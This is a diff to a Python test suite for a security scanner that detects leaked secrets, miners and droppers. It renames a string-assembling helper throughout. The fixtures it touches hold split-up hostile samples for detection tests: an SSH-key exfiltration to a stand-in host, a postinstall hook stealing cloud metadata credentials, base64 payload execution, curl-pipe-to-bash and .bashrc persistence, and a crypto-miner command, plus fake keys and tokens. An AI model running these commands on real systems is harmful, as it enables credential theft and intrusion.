@@ -19,7 +19,7 @@ from cordon_scanner import Scanner
 from cordon_scanner.core.models import Category, Severity
 from cordon_scanner.detect.binary import BinaryDetector
 from cordon_scanner.detect.secrets import ASSIGNMENT, NOT_A_SECRET, SecretNames
-from support import a_finding, assemble
+from support import Support
 
 JAVA_CLASS = b"\xca\xfe\xba\xbe" + (0).to_bytes(2, "big") + (65).to_bytes(2, "big") + b"\x00" * 40
 FAT_MACHO = b"\xca\xfe\xba\xbe" + (2).to_bytes(4, "big") + b"\x00" * 40
@@ -204,7 +204,7 @@ class TestAClassStatementAssignsNothing:
         """The other half of the fix, and the half a narrowing change can break
         silently: every spacing an assignment is actually written with."""
         # Assembled: this file is scanned by the tool it tests.
-        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
         assert ASSIGNMENT.search(line.format(value).encode()) is not None
 
     def test_a_service_class_scans_clean_end_to_end(self, tmp_path) -> None:
@@ -228,7 +228,7 @@ class TestAClassStatementAssignsNothing:
     def test_a_credential_in_the_same_file_still_fires(self, tmp_path) -> None:
         """The guard that makes the test above mean something. A fix that
         stopped the rule firing at all would pass it."""
-        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
         (tmp_path / "settings.py").write_text(
             "class AuthTokenService:\n"
             "\n"
@@ -308,12 +308,14 @@ class TestTRexIsAlsoADinosaur:
         assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)
 
     def test_the_miner_with_its_flags_still_is(self, tmp_path) -> None:
-        line = assemble("t-", "rex.exe -a ethash -o strat", "um+tcp://eth.pool.invalid:4444")
+        line = Support.assemble(
+            "t-", "rex.exe -a ethash -o strat", "um+tcp://eth.pool.invalid:4444"
+        )
         (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
         assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)
 
     def test_the_unambiguous_names_are_untouched(self, tmp_path) -> None:
-        line = assemble("xm", "rig --don", "ate-level 1")
+        line = Support.assemble("xm", "rig --don", "ate-level 1")
         (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
         assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)
 
@@ -575,7 +577,7 @@ class TestANameEndingInPathHoldsAPath:
         assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
 
     def test_a_real_secret_beside_it_still_fires(self, tmp_path) -> None:
-        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
         (tmp_path / ".env.example").write_text(
             f"REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\nSECRET_KEY={value}\n",
             encoding="utf-8",
@@ -589,7 +591,7 @@ class TestANameEndingInPathHoldsAPath:
         path alternative loose enough to accept `/api/v1/auth/token/refresh/` would
         accept this, and `NOT_A_SECRET` is consulted before anything else.
         """
-        aws_shaped = assemble("wJalrXUtnFEMI/K7MDENG/", "bPxRfiCY3XAMPL3K3Y").encode()
+        aws_shaped = Support.assemble("wJalrXUtnFEMI/K7MDENG/", "bPxRfiCY3XAMPL3K3Y").encode()
         assert NOT_A_SECRET.match(aws_shaped) is None
 
 
@@ -731,7 +733,7 @@ class TestACommentedOutSettingConfiguresNothing:
         content, and hiding content in a security scanner is a false negative."""
         # Assembled: this file is scanned by the tool it tests, and a
         # credential-shaped literal here is one the self-scan reports.
-        raw = f'password: "{assemble("aB3kQ9#mZ", "2xT7vL4")}"\n'.encode()
+        raw = f'password: "{Support.assemble("aB3kQ9#mZ", "2xT7vL4")}"\n'.encode()
         assert self.masked(raw) == raw
 
     def test_the_hardened_setting_is_not_an_escape(self, tmp_path) -> None:
@@ -785,10 +787,10 @@ class TestOneCredentialIsOneFinding:
     def test_one_finding_per_key(self, tmp_path) -> None:
         from cordon_scanner.detect.secrets import SecretDetector
 
-        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
-        body = assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXeZL0gYowoK1ht2ZLCDU9vN5")
+        header = Support.assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
+        body = Support.assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXeZL0gYowoK1ht2ZLCDU9vN5")
         (tmp_path / "keys.py").write_text(
-            f'KEY1 = """{header}\n{body}\n{assemble("-----END RSA ", "PRIVATE KEY-----")}"""\n',
+            f'KEY1 = """{header}\n{body}\n{Support.assemble("-----END RSA ", "PRIVATE KEY-----")}"""\n',
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
@@ -801,10 +803,10 @@ class TestOneCredentialIsOneFinding:
 
     def test_two_keys_are_two_findings(self, tmp_path) -> None:
         """The guard: collapsing by rule id alone would report one."""
-        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
+        header = Support.assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
         (tmp_path / "keys.py").write_text(
-            f'KEY1 = """{header}\n{assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXe")}\n"""\n'
-            f'KEY2 = """{header}\n{assemble("MIICXQIBAAKBgQDdUwj1W6r", "S2R9OZDON5mk0BYfaM1it")}\n"""\n',
+            f'KEY1 = """{header}\n{Support.assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXe")}\n"""\n'
+            f'KEY2 = """{header}\n{Support.assemble("MIICXQIBAAKBgQDdUwj1W6r", "S2R9OZDON5mk0BYfaM1it")}\n"""\n',
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
@@ -888,7 +890,7 @@ class TestACredentialInDocumentationIsUsuallyAFormat:
         assert not SourcePaths.is_documentation(path)
 
     def test_a_key_in_a_readme_is_reported_below_blocking(self, tmp_path) -> None:
-        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
         (tmp_path / "README.md").write_text(
             f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
         )
@@ -916,7 +918,7 @@ class TestADoctestIsDocumentation:
         [
             ">>> token = 'variable{0}default:\"Default value\"'",
             "... token = 'variable{0}default:\"Default value\"'",
-            "$ export AUTH_TOKEN=" + assemble("aB3kQ9mZ", "2xT7vL4nR8wY"),
+            "$ export AUTH_TOKEN=" + Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY"),
             "In [3]: token = 'variable{0}default:\"Default value\"'",
         ],
     )
@@ -927,7 +929,7 @@ class TestADoctestIsDocumentation:
         assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
 
     def test_an_ordinary_assignment_still_fires(self, tmp_path) -> None:
-        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
         (tmp_path / "settings.py").write_text(f'SECRET_KEY = "{value}"\n', encoding="utf-8")
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
 
@@ -953,7 +955,7 @@ class TestAWindowsEnvironmentReferenceIsNotAValue:
     def test_a_real_value_is_not(self) -> None:
         from cordon_scanner.detect.secrets import PLACEHOLDER
 
-        assert not PLACEHOLDER.search(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode())
+        assert not PLACEHOLDER.search(Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode())
 
 
 class TestAnUnderscoredNameIsStillAName:
@@ -970,7 +972,7 @@ class TestAnUnderscoredNameIsStillAName:
         assert NOT_A_SECRET.match(value)
 
     def test_key_material_is_still_key_material(self) -> None:
-        assert NOT_A_SECRET.match(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode()) is None
+        assert NOT_A_SECRET.match(Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode()) is None
 
 
 class TestAGpgFingerprintIsNotAWalletAddress:
@@ -1004,7 +1006,7 @@ class TestAGpgFingerprintIsNotAWalletAddress:
     #: scanned by the tool it tests and the tool gets no exception for its own suite.
     @staticmethod
     def fingerprint() -> str:
-        return assemble("0x", "D06AAF4C11DAB86DF42", "1421EFE6B20ECA7AD98A1")
+        return Support.assemble("0x", "D06AAF4C11DAB86DF42", "1421EFE6B20ECA7AD98A1")
 
     @staticmethod
     def address() -> str:
@@ -1018,7 +1020,7 @@ class TestAGpgFingerprintIsNotAWalletAddress:
         ninety-five characters are a shape nothing else produces.
         """
         alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
-        return assemble("4A", (alphabet * 3)[:93])
+        return Support.assemble("4A", (alphabet * 3)[:93])
 
     @pytest.mark.parametrize(
         "template",
@@ -1043,7 +1045,7 @@ class TestAGpgFingerprintIsNotAWalletAddress:
     def test_a_sponsorship_manifest_is_not_mining(self, tmp_path) -> None:
         """GitHub reads this exact filename, and an address in it was published on
         purpose as somewhere to send money."""
-        owner = assemble("0x", "5393BdeA2a020769256d", "9f337B0fc81a2F64850A")
+        owner = Support.assemble("0x", "5393BdeA2a020769256d", "9f337B0fc81a2F64850A")
         (tmp_path / "FUNDING.json").write_text(
             '{\n  "drips": {\n    "ethereum": {\n'
             f'      "ownedBy": "{owner}"\n'
@@ -1057,8 +1059,8 @@ class TestAGpgFingerprintIsNotAWalletAddress:
         evidence the composite's message actually describes."""
         # Split across every indicator: the miner binary name, the protocol scheme
         # and the pool host each match on their own.
-        miner = assemble("xm", "rig")
-        pool = assemble("stratum", "+tcp://", "pool.", "minexmr", ".com:4444")
+        miner = Support.assemble("xm", "rig")
+        pool = Support.assemble("stratum", "+tcp://", "pool.", "minexmr", ".com:4444")
         (tmp_path / "run.sh").write_text(
             f"#!/bin/sh\n./{miner} -o {pool} -u {self.address()}\n", encoding="utf-8"
         )
@@ -1187,7 +1189,7 @@ class TestTokenMeansTwoThings:
     VALUE = ("aB3kQ9mZ", "2xT7vL4nR8wY")
 
     def fires(self, name: str) -> bool:
-        return ASSIGNMENT.search(f'{name} = "{assemble(*self.VALUE)}"'.encode()) is not None
+        return ASSIGNMENT.search(f'{name} = "{Support.assemble(*self.VALUE)}"'.encode()) is not None
 
     @pytest.mark.parametrize(
         "name",
@@ -1928,7 +1930,7 @@ class TestAGoCompositeLiteralIsNotACredential:
 
     @pytest.mark.parametrize("line", ['SECRET_KEY = "{0}"', "api_token={0}", "password: '{0}'"])
     def test_a_real_assignment_still_fires(self, line: str) -> None:
-        assert self.fires(line.format(assemble(*self.VALUE)))
+        assert self.fires(line.format(Support.assemble(*self.VALUE)))
 
     def test_a_value_that_says_it_is_not_a_credential(self) -> None:
         """Vault's rollback test sets `bindpass="intentionally-wrong-password"`, which
@@ -1936,7 +1938,7 @@ class TestAGoCompositeLiteralIsNotACredential:
         from cordon_scanner.detect.secrets import PLACEHOLDER
 
         assert PLACEHOLDER.search(b"intentionally-wrong-password")
-        assert not PLACEHOLDER.search(assemble(*self.VALUE).encode())
+        assert not PLACEHOLDER.search(Support.assemble(*self.VALUE).encode())
 
     @pytest.mark.parametrize(
         "path",
@@ -2005,7 +2007,7 @@ class TestOneVariableAssignedToAnother:
     def test_key_material_is_not_laundered(self, parts: tuple[str, ...]) -> None:
         """The guard the threshold experiment tripped. Kept here too, because this is
         where somebody reading the fix will be."""
-        assert not self.dismissed(assemble(*parts).encode())
+        assert not self.dismissed(Support.assemble(*parts).encode())
 
     def test_a_sentinel_wears_underscores_at_both_ends(self) -> None:
         """webpack declares `MODULE_REFERENCE_TOKEN = "__WEBPACK_MODULE_REFERENCE__"`.
@@ -2628,7 +2630,7 @@ class TestAnotherAnalysersRuleCorpusIsNotAFinding:
         )
         (package / "i.js").write_bytes(
             b"// ruleid: credential-exfiltration\n"
-            + assemble(
+            + Support.assemble(
                 "const k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n",
                 "require('https').request('https://x.test/c', {method:'POST'}).end(k);\n",
             ).encode()
@@ -2723,7 +2725,7 @@ class TestTheMetadataEndpointIsNotTheNetwork:
             '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "sh steal.sh"}}'
         )
         (hook / "steal.sh").write_bytes(
-            assemble(
+            Support.assemble(
                 "#!/bin/sh\n",
                 "CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/",
                 "security-credentials/role)\n",
@@ -2820,7 +2822,9 @@ class TestAnElephantInACommentIsNotAnElephant:
         source = tmp_path / "app"
         source.mkdir()
         (source / "client.py").write_bytes(
-            ("# " + assemble("ghp_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8") + "\n").encode()
+            (
+                "# " + Support.assemble("ghp_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8") + "\n"
+            ).encode()
         )
         assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)
 
@@ -2836,7 +2840,9 @@ class TestAnElephantInACommentIsNotAnElephant:
             # `decoded_is_not_a_secret` was written, and then this control stopped
             # controlling for anything. A value whose base64 decodes to bytes nobody
             # typed is the vehicle that still exercises the claim.
-            ("api_key = " + repr(assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")) + "\n").encode()
+            (
+                "api_key = " + repr(Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")) + "\n"
+            ).encode()
         )
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
 
@@ -2934,7 +2940,9 @@ class TestADeclarationAssignsNothing:
                 # on purpose and is now exempt at the finding site, so as a control it
                 # asserted nothing. This one carries no provider prefix, which is what
                 # keeps the assertion on the GENERIC rule rather than a provider's.
-                "    private let apiKey = " + repr(assemble("dbw2OtmVEe", "uUvIptb1Coyg")) + "\n}\n"
+                "    private let apiKey = "
+                + repr(Support.assemble("dbw2OtmVEe", "uUvIptb1Coyg"))
+                + "\n}\n"
             ).encode()
         )
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
@@ -3007,7 +3015,7 @@ class TestProvisioningAMachineIsNotAFoothold:
         hook = tmp_path / "agent"
         hook.mkdir()
         (hook / "telemetry.sh").write_bytes(
-            assemble(
+            Support.assemble(
                 "#!/bin/sh\n",
                 'body="$(curl -fsSL https://cdn.test/agent.sh)"\n',
                 'echo "$body" >> "$HOME/.bashrc"\n',
@@ -3027,7 +3035,7 @@ class TestProvisioningAMachineIsNotAFoothold:
         template = tmp_path / "scripts"
         template.mkdir()
         (template / "install-node.sh").write_bytes(
-            assemble(
+            Support.assemble(
                 "#!/bin/bash\n",
                 "apt-get install -y curl\n",
                 "curl -fsSL https://get.helm.test/install.sh | bash\n",
@@ -3202,7 +3210,7 @@ class TestARegexMatchIsNotAProcess:
         source = tmp_path / "app"
         source.mkdir()
         (source / "loader.py").write_bytes(
-            assemble(
+            Support.assemble(
                 "import base64, subprocess\n",
                 "payload = base64.b64decode(BLOB)\n",
                 "subprocess.run(payload, shell=True)\n",
@@ -3216,7 +3224,7 @@ class TestARegexMatchIsNotAProcess:
         source = tmp_path / "app"
         source.mkdir()
         (source / "stage.py").write_bytes(
-            assemble(
+            Support.assemble(
                 "import base64, subprocess\n",
                 "open('/tmp/update', 'wb').write(base64.b64decode(BLOB))\n",
                 "subprocess.run(['/tmp/update'])\n",
@@ -3391,7 +3399,7 @@ class TestAReferenceIsNotAValue:
         deploy = tmp_path / "deploy"
         deploy.mkdir()
         (deploy / "server.key").write_bytes(
-            assemble(
+            Support.assemble(
                 "-----BEGIN RSA ",
                 "PRIVATE KEY-----\n",
                 "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
@@ -3583,7 +3591,7 @@ class TestDocumentationInsideSourceIsStillDocumentation:
                 "EXAMPLES = r'''\n"
                 "- name: Create a token\n"
                 "  community.general.consul_token:\n"
-                "    token: " + assemble("8adddd91-0bd6-", "d41d-ae1a-3b49cfa9a0e8") + "\n"
+                "    token: " + Support.assemble("8adddd91-0bd6-", "d41d-ae1a-3b49cfa9a0e8") + "\n"
                 "'''\n\n"
                 "def main():\n    pass\n"
             ).encode()
@@ -3602,7 +3610,9 @@ class TestDocumentationInsideSourceIsStillDocumentation:
         # is now graded to MEDIUM wherever it sits -- see `CANONICAL_UUID` -- so as a
         # control for the documentation ceiling it would have asserted nothing.
         (plugins / "consul_token.py").write_bytes(
-            ("TOKEN = " + repr(assemble("Xk9mQ2vB7wRt", "Y4uZp1LsDy3Fz6Hj")) + "\n").encode()
+            (
+                "TOKEN = " + repr(Support.assemble("Xk9mQ2vB7wRt", "Y4uZp1LsDy3Fz6Hj")) + "\n"
+            ).encode()
         )
         secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
         assert secrets and any(f.severity >= Severity.HIGH for f in secrets)
@@ -4036,7 +4046,9 @@ class TestTheLanguagesOwnPlaceForTests:
                 "pub fn compare(a: &str, b: &str) -> bool { a == b }\n\n"
                 "#[cfg(test)]\nmod tests {\n    use super::*;\n    #[test]\n"
                 "    fn compares() {\n"
-                '        let secret_key = "' + assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI") + '";\n'
+                '        let secret_key = "'
+                + Support.assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")
+                + '";\n'
                 "        assert!(compare(secret_key, secret_key));\n    }\n}\n"
             ).encode()
         )
@@ -4053,7 +4065,7 @@ class TestTheLanguagesOwnPlaceForTests:
         (source / "auth.rs").write_bytes(
             (
                 "pub fn connect() {\n"
-                '    let secret_key = "' + assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI") + '";\n'
+                '    let secret_key = "' + Support.assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI") + '";\n'
                 "    dial(secret_key);\n}\n\n"
                 "#[cfg(test)]\nmod tests {\n    #[test]\n    fn nothing() {}\n}\n"
             ).encode()
@@ -4161,7 +4173,7 @@ class TestOneCredentialIsOneFindingAcrossFiles:
     finding.
     """
 
-    KEY = assemble(
+    KEY = Support.assemble(
         "-----BEGIN RSA ",
         "PRIVATE KEY-----\n",
         "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
@@ -4291,7 +4303,7 @@ class TestADirectoryOfKeysIsACorpus:
     looks like, and those are untouched.
     """
 
-    KEY = assemble(
+    KEY = Support.assemble(
         "-----BEGIN RSA ",
         "PRIVATE KEY-----\n",
         "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
@@ -4421,7 +4433,7 @@ class TestGatingOnCiIsWhatPrepareScriptsDo:
         scripts = tmp_path / "agent"
         scripts.mkdir()
         (scripts / "boot.py").write_bytes(
-            assemble(
+            Support.assemble(
                 "import os, base64, urllib.request\n",
                 "if os.environ.get('CI'):\n    raise SystemExit(0)\n",
                 "blob = urllib.request.urlopen('https://x.test/p').read()\n",
@@ -4488,7 +4500,7 @@ class TestACiScriptIsNotADropper:
         flow = tmp_path / ".buildkite" / "scripts"
         flow.mkdir(parents=True)
         (flow / "upload.sh").write_bytes(
-            assemble("#!/bin/bash\n", "curl -s https://codecov.test/bash | bash\n").encode()
+            Support.assemble("#!/bin/bash\n", "curl -s https://codecov.test/bash | bash\n").encode()
         )
         assert "MALWARE.DROPPER.001" in flagged(tmp_path)
 
@@ -4700,7 +4712,9 @@ class TestVendoredCodeIsSomebodyElsesSource:
         gem = tmp_path / "vendor" / "bundle" / "ruby" / "gems" / "thing-1.0" / "lib"
         gem.mkdir(parents=True)
         (gem / "client.rb").write_bytes(
-            ("API_TOKEN = " + repr(assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")) + "\n").encode()
+            (
+                "API_TOKEN = " + repr(Support.assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")) + "\n"
+            ).encode()
         )
         secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
         assert secrets, "still reported"
@@ -4712,7 +4726,9 @@ class TestVendoredCodeIsSomebodyElsesSource:
         lib = tmp_path / "lib"
         lib.mkdir()
         (lib / "client.rb").write_bytes(
-            ("API_TOKEN = " + repr(assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")) + "\n").encode()
+            (
+                "API_TOKEN = " + repr(Support.assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")) + "\n"
+            ).encode()
         )
         secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
         assert secrets and any(f.severity >= Severity.HIGH for f in secrets)
@@ -7268,12 +7284,12 @@ class TestAKeyNamedPlaceholderSaysWhatItsValueIs:
         ["placeholder", "example", "hint", "sample", "demo", "dummy", "template", "defaultValue"],
     )
     def test_the_key_names_the_value_an_illustration(self, tmp_path, key: str) -> None:
-        token = assemble("sk-", "myApiKeyToAccessMyChromaInstanceXQ2m")
+        token = Support.assemble("sk-", "myApiKeyToAccessMyChromaInstanceXQ2m")
         assert "SECRET.OPENAI.KEY.001" not in self._rules(tmp_path, f'<input {key}="{token}" />\n')
 
     def test_the_same_token_under_an_ordinary_key_is_reported(self, tmp_path) -> None:
         """The control. Nothing about the value changed; only the author's statement did."""
-        token = assemble("sk-", "myApiKeyToAccessMyChromaInstanceXQ2m")
+        token = Support.assemble("sk-", "myApiKeyToAccessMyChromaInstanceXQ2m")
         assert "SECRET.OPENAI.KEY.001" in self._rules(tmp_path, f'<input value="{token}" />\n')
 
     def test_the_window_is_the_key_and_not_the_paragraph(self) -> None:
@@ -7300,12 +7316,12 @@ class TestTheAlphabetInsideAProviderPrefix:
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_a_documented_stripe_key_is_the_alphabet(self, tmp_path) -> None:
-        key = assemble("sk_live_", "abcdefghijklmnopqrstuvwxyz0123456789")
+        key = Support.assemble("sk_live_", "abcdefghijklmnopqrstuvwxyz0123456789")
         assert "SECRET.STRIPE.KEY.001" not in self._rules(tmp_path, f"Set `{key}` in your env.\n")
 
     def test_a_real_stripe_key_has_no_run_in_it(self, tmp_path) -> None:
         """The control, and the reason the threshold is a run of six and not of three."""
-        key = assemble("sk_live_", "51Kq2mVt7Xb1NpLr4Ws9Dy3Fz6Hj0Cg5Aq2EgHj0")
+        key = Support.assemble("sk_live_", "51Kq2mVt7Xb1NpLr4Ws9Dy3Fz6Hj0Cg5Aq2EgHj0")
         assert "SECRET.STRIPE.KEY.001" in self._rules(tmp_path, f"export STRIPE={key}\n")
 
 
@@ -7323,13 +7339,13 @@ class TestThePublicHalfOfASignature:
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_a_key_id_in_a_presigned_url_is_not_a_leak(self, tmp_path) -> None:
-        key = assemble("AKIA", "ISTNZFOVBIJMK3TQ")
+        key = Support.assemble("AKIA", "ISTNZFOVBIJMK3TQ")
         url = f"https://s3.amazonaws.com/x?X-Amz-Credential={key}%2F20190101%2Fus-east-1"
         assert "SECRET.AWS.ACCESS_KEY.001" not in self._rules(tmp_path, f"1,title,{url}\n")
 
     def test_the_same_id_in_a_config_line_is_reported(self, tmp_path) -> None:
         """The control. `X-Amz-Credential=` is the whole of the claim."""
-        key = assemble("AKIA", "ISTNZFOVBIJMK3TQ")
+        key = Support.assemble("AKIA", "ISTNZFOVBIJMK3TQ")
         assert "SECRET.AWS.ACCESS_KEY.001" in self._rules(tmp_path, f"aws_access_key_id,{key}\n")
 
 
@@ -7680,7 +7696,7 @@ class TestAnAccessKeyIdIsNotACredential:
         ]
 
     def test_an_id_on_its_own_is_graded_down(self, tmp_path) -> None:
-        key = assemble("AKIA", "46X5W6CZI5DHEBFL")
+        key = Support.assemble("AKIA", "46X5W6CZI5DHEBFL")
         found = self._aws(tmp_path, f"env:\n  CACHES_AWS_ACCESS_KEY_ID: {key}\n")
         assert len(found) == 1
         assert found[0].severity <= Severity.MEDIUM
@@ -7688,7 +7704,7 @@ class TestAnAccessKeyIdIsNotACredential:
 
     def test_the_pair_is_reported_in_full(self, tmp_path) -> None:
         """The control. `yt-dlp` hardcodes a genuine pair a line apart."""
-        key = assemble("AKIA", "I6X4TYCIXM2B7MUQ")
+        key = Support.assemble("AKIA", "I6X4TYCIXM2B7MUQ")
         found = self._aws(
             tmp_path,
             f"access_key: {key}\nsecret_key: 4WUUJWuFvtTkXbhaWTDv7MhO+0LqoYDWfEnUXoWn\n",
@@ -8178,7 +8194,7 @@ class TestAKeyInAnAndroidManifestShipsInTheApk:
     Nothing else in a manifest is excused by this.
     """
 
-    KEY: ClassVar[str] = assemble("AIzaSy", "Ad15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU")
+    KEY: ClassVar[str] = Support.assemble("AIzaSy", "Ad15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU")
 
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> set[str]:
@@ -8213,7 +8229,7 @@ class TestFirebasesWebConfigSaysItIsPublic:
     and the name the rule sees is `apiKey`.
     """
 
-    KEY: ClassVar[str] = assemble("AIzaSy", "Ad15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU")
+    KEY: ClassVar[str] = Support.assemble("AIzaSy", "Ad15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU")
 
     @staticmethod
     def _rules(tmp_path, body: str) -> set[str]:
@@ -9136,7 +9152,7 @@ class TestATypeAliasDefinesAName:
 
     def test_a_real_assignment_in_the_same_language_still_reports(self, tmp_path) -> None:
         """The control. `typealias` is a keyword, not a word that happens to be nearby."""
-        value = assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
+        value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
         assert "SECRET.GENERIC.ASSIGNMENT.001" in self._rules(
             tmp_path, "Keys.swift", f'let svrAuthCredential = "{value}"\n'
         )
@@ -9555,14 +9571,14 @@ class TestHelpTextTheCommandPrints:
         """The control. A backtick is how Go writes any multi-line string, and most of
         them are not help text -- what excuses this one is the declaration in front of
         it."""
-        value = assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
+        value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
         body = f'package config\n\nvar settings = `\n\tapi_token = "{value}"\n`\n'
         assert "SECRET.GENERIC.ASSIGNMENT.001" in self._rules(tmp_path, "settings.go", body)
 
     def test_the_same_literal_in_another_language_reports(self, tmp_path) -> None:
         """And the parity trick is Go's alone: a backtick in a JavaScript template literal
         means something else, and this must not reach it."""
-        value = assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
+        value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
         body = f"const examples = `\n  run --password={value}\n`;\n"
         assert "SECRET.GENERIC.ASSIGNMENT.001" in self._rules(tmp_path, "examples.js", body)
 
@@ -9659,7 +9675,7 @@ class TestGrafanasDefaultSecretKey:
         """The control, and the whole point of Grafana's advisor: the value matters
         because it is the one nobody changed."""
         (tmp_path / "grafana.ini").write_text(
-            "secret_key = " + assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE") + "\n"
+            "secret_key = " + Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE") + "\n"
         )
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
 
@@ -9812,7 +9828,7 @@ class TestAKeyTheSitesOwnPlayerHolds:
     def test_the_key_is_graded_and_says_whose_it_is(self, tmp_path) -> None:
         package = tmp_path / "yt_dlp" / "extractor"
         package.mkdir(parents=True)
-        value = assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
+        value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
         (package / "examplesite.py").write_text(self.EXTRACTOR.format(value=value))
         found = [
             f
@@ -9826,7 +9842,7 @@ class TestAKeyTheSitesOwnPlayerHolds:
     def test_the_same_key_in_application_source_is_not(self, tmp_path) -> None:
         """The control. What grades the extractor is its own declaration; an application
         that hardcodes a key has made no such declaration and can rotate it."""
-        value = assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
+        value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
         (tmp_path / "client.py").write_text(f"_API_KEY = '{value}'\n")
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
 
@@ -10253,7 +10269,7 @@ class TestTheSameCredentialNameInManyFiles:
             target.mkdir(parents=True, exist_ok=True)
             # A different value per backend: one OAuth app per provider, which is why the
             # snippet hash differs and the existing idiom collapse cannot see them.
-            value = assemble("aB3kQ9mZ2xT7vF8c", f"H1jL5nP0rS4wY6u{backend[0].upper()}")
+            value = Support.assemble("aB3kQ9mZ2xT7vF8c", f"H1jL5nP0rS4wY6u{backend[0].upper()}")
             (target / f"{backend}.go").write_text(
                 f'package {backend}\n\nconst (\n\t{name} = "{value}"\n)\n'
             )
@@ -10280,7 +10296,7 @@ class TestTheSameCredentialNameInManyFiles:
         assert len(first) == 1
         second = tmp_path / "backend" / "other"
         second.mkdir(parents=True)
-        value = assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uZ")
+        value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uZ")
         (second / "other.go").write_text(f'package other\n\nconst (\n\tapiSecret = "{value}"\n)\n')
